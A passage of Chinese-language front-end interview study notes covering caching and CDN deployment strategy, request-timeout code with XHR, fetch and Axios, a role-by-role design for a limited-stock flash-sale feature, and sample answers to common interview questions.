| 无哈希的静态资源 | 短期缓存或不缓存       | `Cache-Control: max-age=300`（缓存 5 分钟）或`no-store`（完全不缓存） |
| API 接口数据     | 按需缓存（视业务而定） | `Cache-Control: max-age=60`（短期缓存，如 1 分钟）+ `Last-Modified`（记录最后修改时间，用于协商缓存） |

**关键逻辑：**

- 对 “内容不变” 的资源（带哈希）设置长缓存，减少重复请求；
- 对 “入口文件（HTML）” 和 “频繁变化的资源” 设置短缓存或强制验证，确保更新能被感知。

### **CDN 缓存：主动刷新或版本隔离**

若使用 CDN（内容分发网络），CDN 节点可能缓存了旧资源，需额外处理：

- **主动刷新 CDN 缓存**：部署新版本后，通过 CDN 控制台或 API 主动 “清除（Purge）” 旧资源的缓存（如指定`*.js`、`*.css`路径）。注意：全量刷新可能影响 CDN 性能，建议只刷新变化的资源路径（如带旧哈希的文件）。

- **版本目录隔离**：将不同版本的资源部署到独立目录（如`/v1/`、`/v2/`），CDN 会自动将新目录的资源视为新内容，无需手动刷新。例如：

  - 旧版本：`https://cdn.example.com/v1/app.js`

  - 新版本：`https://cdn.example.com/v2/app.js`

    部署时只需切换 HTML 中引用的版本目录即可

### **部署策略：避免新旧版本资源共存导致的混合加载**

如果部署过程中存在 “新旧服务器 / 容器同时提供服务” 的窗口期（如滚动更新），可能出现用户请求到旧服务器的 HTML（引用旧资源），但静态资源已更新到新版本，导致 “404 错误” 或 “资源不匹配”。解决方式：

- **蓝绿部署**：先部署新版本到 “绿环境”，验证通过后将流量从 “蓝环境（旧版本）” 切换到 “绿环境”，切换瞬间旧环境直接下线，避免共存。
- **灰度发布**：逐步将部分流量切到新版本，确保新版本资源完全部署后再扩大范围，同时监控是否有旧资源引用错误。
- **资源预部署**：先部署静态资源（带新哈希），再部署引用新资源的 HTML，确保 HTML 上线时，对应的静态资源已在 CDN / 服务器就绪。

### **兜底方案：强制刷新与版本提示**

尽管上述方法可解决大部分问题，仍可能存在极端场景（如用户本地缓存未过期），可补充：

- **前端版本校验**：在页面加载时，通过 API 请求 “最新版本号”，与本地存储的版本号对比，若不一致，提示用户 “有新版本，是否刷新”（如通过`location.reload(true)`强制刷新，忽略缓存）。
- **Service Worker 缓存清理**（PWA 场景）：若使用 Service Worker 缓存资源，需在新版本部署时更新`service-worker.js`的版本标识，触发客户端 SW 更新，清理旧缓存。

### **总结：核心流程**

1. **构建阶段**：静态资源加内容哈希，确保内容变则路径变；
2. **缓存配置**：HTML 禁止强缓存，带哈希资源长缓存，API 按需缓存；
3. **CDN 处理**：部署后刷新旧缓存或用版本目录隔离；
4. **部署策略**：用蓝绿 / 灰度发布避免新旧资源混合；
5. **兜底机制**：前端版本校验 + 强制刷新提示

## 超时请求终止方案

### 客户端

#### `XMLHttpRequest` 原生超时控制

通过`timeout`属性设置超时时间，`ontimeout`事件处理超时逻辑：

```js
const xhr = new XMLHttpRequest();
xhr.open('GET', '/api/data', true);
xhr.timeout = 5000; // 超时时间5秒（单位：毫秒）

xhr.ontimeout = function() {
  console.log('请求超时，已终止');
  xhr.abort(); // 终止请求
};

xhr.onreadystatechange = function() {
  if (xhr.readyState === 4) {
    if (xhr.status === 200) {
      console.log('请求成功', xhr.responseText);
    }
  }
};

xhr.send();
```



#### `Fetch API` 结合 `AbortController`

Fetch 本身不支持`timeout`参数，需通过`AbortController`的信号（signal）终止请求：

```js
// 创建控制器
const controller = new AbortController();
const { signal } = controller;

// 设置超时：5秒后终止请求
const timeoutId = setTimeout(() => {
  controller.abort(); // 终止请求
  console.log('请求超时，已终止');
}, 5000);

// 发起请求
fetch('/api/data', { signal })
  .then(response => response.json())
  .then(data => {
    clearTimeout(timeoutId); // 清除超时定时器
    console.log('请求成功', data);
  })
  .catch(error => {
    if (error.name === 'AbortError') {
      console.log('请求被主动终止（超时）');
    } else {
      console.log('其他错误', error);
    }
  });
```



#### 第三方请求库（如 Axios）

主流库内置超时配置，底层基于`XMLHttpRequest`或`AbortController`实现：

```js
import axios from 'axios';

// 全局配置超时（所有请求生效）
axios.defaults.timeout = 5000; // 5秒超时

// 单个请求配置超时
axios.get('/api/data', { timeout: 5000 })
  .then(response => console.log('成功', response.data))
  .catch(error => {
    if (error.code === 'ECONNABORTED') {
      console.log('请求超时，已终止');
    }
  });
```



## 饥饿营销功能分工

给商城添加 “饥饿营销” 功能，核心是通过 “限量、限时、竞争感” 刺激用户购买，技术上需解决**库存精准控制、高并发抢购、实时状态同步、用户体验流畅性**四大问题。

从工程师视角，可按 “需求拆解→角色分工→协作流程” 三步拆解，涉及前端、后端、测试、运维等多角色协作，具体分工如下：

### 核心功能点

在分工前，需先定义清楚功能边界，典型饥饿营销功能包括：

1. **活动配置层**：后台可设置商品限量（如 1000 件）、活动时间（如 10:00-10:30）、限购规则（如每个用户限 1 件）、预热展示（提前 2 小时显示倒计时）。
2. **用户交互层**：活动页实时显示 “剩余库存”“已抢数量”“倒计时”，抢购按钮状态动态变化（可抢→抢购中→已售罄），抢中 / 未抢中实时反馈（如 “恭喜抢到”“手慢了”）。
3. **核心逻辑层**：库存实时扣减（防超卖）、高并发抢购请求处理（防重复提交、防刷）、用户资格校验（登录状态、限购次数）。
4. **异常与兼容层**：网络延迟时的状态同步、并发抢购的排队机制、活动结束后的状态清理。

### 角色分工

####  产品：定规则、划边界

- 输出《饥饿营销活动规则文档》：明确商品范围（哪些商品参与）、库存总量（如 1000 件）、限购规则（每个用户 ID / 手机号限 1 件）、活动时间（开始 / 结束时间，精确到秒）、异常场景处理（如用户抢中后未付款，库存是否释放、释放时间）。
- 绘制用户流程图：用户从 “活动预热页→倒计时结束→点击抢购→结果页” 的全流程，标注关键节点（如倒计时结束时的流量峰值点）。
- 定义核心指标：参与人数、抢购成功率、超卖率（必须为 0）、页面响应时间（目标≤300ms）。

#### 前端工程师：做交互、控体验

- **活动页开发：**
  - 倒计时组件：精确到秒，结束时自动切换按钮状态（如从 “即将开始” 变为 “立即抢购”），兼容客户端时间偏差（通过后端接口同步服务器时间）。
  - 库存实时展示：通过 WebSocket 或轮询（高并发时建议长轮询，降低服务器压力）获取剩余库存，用动画效果强化 “库存减少” 的紧迫感（如数字滚动）。
  - 抢购按钮状态管理：未开始时置灰不可点击，抢购中显示 “抢购中...” 并禁用重复点击（防止前端重复提交），售罄后显示 “已抢完”。
- **结果反馈优化：**
  - 抢购请求发送后显示 “排队中...” 加载态，避免用户频繁点击。
  - 接收后端结果后，用弹窗 + 音效强化反馈（如抢中时显示 “恭喜！已加入购物车”，未中时显示 “手慢了，下次再来”）。
- **兼容性处理**：适配移动端 / PC 端，弱网环境下增加 “重试” 按钮，本地缓存活动基本信息（如开始时间），避免页面刷新后数据丢失。

####  后端工程师：保精准、抗并发

- **活动配置模块：**
  - 开发后台 API：支持运营配置活动（商品 ID、库存总量、开始 / 结束时间、限购规则），数据存储在 MySQL（活动基本信息）+ Redis（缓存活动状态，避免频繁查库）。
  - 活动状态校验：接口层统一拦截，非活动时间 / 已结束的请求直接返回 “活动未开始 / 已结束”。
- **库存与抢购核心逻辑（最关键）：**
  - 防超卖设计：
    - 库存预扣减：用 Redis 原子操作（如`decr`）做库存扣减，扣减成功（返回值≥0）才视为抢中，失败则返回 “已售罄”（Redis 库存初始值 = 活动配置的总量）。
    - 最终一致性：Redis 扣减后，异步同步到 MySQL（用消息队列如 Kafka，避免同步写入阻塞接口），并定时校验 Redis 与 MySQL 库存一致性（防止 Redis 宕机导致数据丢失）。
  - 高并发处理：
    - 接口限流：用 Sentinel 对抢购接口设置 QPS 阈值（如 10 万 / 秒，根据服务器承载能力调整），超过阈值返回 “当前拥挤，请重试”。
    - 队列削峰：抢购请求先进入 Kafka 队列，后端用消费者集群按 “库存剩余量” 匀速处理（如每秒处理 1000 单），避免瞬间压垮数据库。
  - 用户限购校验：
    - 用 Redis 记录用户抢购记录（key = 活动 ID + 用户 ID，value = 抢购次数），每次请求先校验是否超过限购次数（如`get(key) < 1`），避免黄牛多账号抢购。
- **结果通知**：抢中后通过消息队列触发后续流程（如加入购物车、发送短信通知），并提供 “抢购结果查询 API” 供前端轮询（避免长连接超时）。

#### 测试工程师：测边界、压性能

- **功能测试：**
  - 正常流程：活动预热→开始→抢购→成功 / 失败反馈，验证库存扣减是否准确（抢中 1 件，库存减 1）。
  - 边界场景：
    - 库存为 0 时，是否无法抢购；
    - 同一用户多次点击，是否只扣减 1 次库存；
    - 活动结束瞬间提交的请求，是否被拒绝；
    - 网络中断后重连，是否能正确显示抢购结果。
- **性能测试：**
  - 高并发压测：用 JMeter 模拟 10 万用户同时点击抢购，测试接口响应时间（目标≤500ms）、Redis/MySQL 是否稳定（无宕机、无数据错乱）。
  - 极限场景：模拟库存 1000 件，2 万用户同时抢购，验证是否超卖（必须 0 超卖）、是否有漏扣（库存最终为 0）。
- **安全测试：**
  - 防刷测试：模拟脚本批量请求（如同一 IP / 设备多账号），验证是否被限流拦截；
  - 接口防重放：验证重复提交的请求（如抓包重发）是否被识别并拒绝。

#### 运维工程师：扩资源、保稳定

- 资源扩容：
  - 前端：活动页静态资源（图片、JS）部署到 CDN，增加节点覆盖（尤其活动目标用户所在地区）。
  - 后端：应用服务器（如 Tomcat）扩容至平时的 5-10 倍（根据压测结果），Redis 集群扩容（增加从节点，分担读压力），MySQL 主从架构优化（从库负责活动状态查询，主库负责库存写入）。
  - 中间件：Kafka 增加分区数（如从 10 分区扩至 50 分区），提高消息处理能力；负载均衡器（如 Nginx）配置会话保持，避免请求分发不均。
- 监控与应急：
  - 实时监控：用 Prometheus+Grafana 监控接口 QPS、Redis 库存、MySQL 连接数、服务器 CPU / 内存，设置告警阈值（如 QPS 突增 10 倍、Redis 内存使用率 > 80%）。
  - 应急预案：
    - 流量超预期：临时开启接口限流（降低 QPS 阈值），并在前端显示 “当前人数过多，请稍后再试”；
    - Redis 宕机：快速切换至备用 Redis 集群，从 MySQL 加载最新库存数据；
    - 超卖风险：紧急暂停活动（通过后台开关），并触发库存校准脚本（以 MySQL 为准同步 Redis）。

#### 数据分析师：盯数据、做复盘

- 实时监控：活动期间跟踪核心数据（参与用户数、每秒抢购请求数、抢中转化率、库存消耗速度），发现异常（如库存消耗为 0 但请求仍激增）及时通知技术团队。
- 复盘报告：活动结束后输出分析（如流量峰值时间、用户抢购行为分布、未抢中用户的流失节点），为下次活动优化提供依据（如调整库存总量、延长活动时间）。

### 协作流程（关键节点对齐）

1. **需求对齐**：产品牵头，前后端 / 测试 / 运维参与需求评审，明确 “防超卖”“高并发” 是核心指标，前端体验不卡顿、后端数据不错乱是底线。
2. **技术方案评审**：后端主导，讲解库存扣减逻辑（Redis+MySQL + 消息队列）、高并发处理方案（限流 + 队列），前端确认实时同步机制（WebSocket / 轮询），运维评估资源是否足够。
3. 联调与测试：
   - 前后端联调：接口对接（活动状态、库存查询、抢购提交、结果查询），重点测试 “库存实时性”（前端显示与后端实际库存偏差≤1 秒）。
   - 性能压测：测试 + 后端 + 运维共同参与，模拟 10 万用户并发，验证系统稳定性，根据结果优化（如调整 Redis 内存、增加服务器）。
4. **预发布与演练**：在预发布环境部署全量代码，模拟活动全流程（包括应急场景，如手动触发限流、Redis 宕机切换），确保各角色熟悉应急预案。
5. **上线与监控**：运维按计划扩容资源，开发 / 测试 / 产品全程在线监控，活动结束后共同复盘。

# 经典问题

- 项目困难
- 离职原因



## 项目中遇到什么困难，怎么解决的

背景、任务、过程、结果、总结

> 案例一，流程不熟悉

1. 刚接手项目时，需要新增一个组件（**任务**），但是我不怎么了解新增组件的流程，规范等等，时间又不是很充裕（**背景**）；
2. 复制一个已有组件，然后通过对比和反复修改（**过程**），在要求的时间内完成了一个组件的新增；（**结果**）
3. 之后把这个过程记录下来，以后新增组件便不是问题；(**总结**)

> 案例二，优化流程

1. 一般在周五打镜像，每次构建镜像时，发现用时很长，一个1小时左右，导致经常加班（**背景**），我想缩短这个时间（**任务**）；
2. 通过查阅Dockerfile的一些概念，并询问后端的同事相关意见，最终采用搭建基础镜像（将一些安装下载的稳定环境放到该镜像，无需每次重复安装），调整dockerfile文件；（**过程**）
3. 最后，将构建镜像时间缩短至几十秒；（**结果**）
4. 通过这次，了解到Docker的一些基础概念；（**总结**）

> 案例三，调试技巧

1. 在修改一个bug，需要追踪某个状态，当时只会console.log，在传递过程中需要在各个组件打印，效率很低；（**背景**）
2. 我想提高这个过程的效率（**任务**），上网查询相关资料，发现可以：（**过程**）
   1. debugger断点调试；
   2. React Developer tools插件定位组件，然后查看props；
   3. 通过Redux DevTools插件查看action；
   4. 通过浏览器的开发者工具的network一栏，可以找出请求发起的action；
3. 通过这次，学会一些调试技巧（**结果**）

> 案例四，不熟悉某一方案

## 为什么离职

有两方面：

- 前leader跑路了，新的leader变成一个运营；
- 导致我的工作内容发生重大变化，不符合我的职业规划，所以辞职寻求更合适的发展；

## 你还有什么想问的吗

3中情况：

- 部门负责人
- HR
- 高层领导

> 部门负责人

- 团队目前最主要的任务是什么？
- 如果有机会能加入团队，您对我有什么期望？

> HR

- 咱们这儿工作时间是怎么样的？
-  如果顺利入职的话，请问我的试用期是多久,薪资打折吗？
-  请问贵公司在待遇福利方面有哪些呢？

> 高层领导

- 请问团队当下的重点工作是什么呢？
- 对于这个岗位，您对我当下的有什么建议吗？
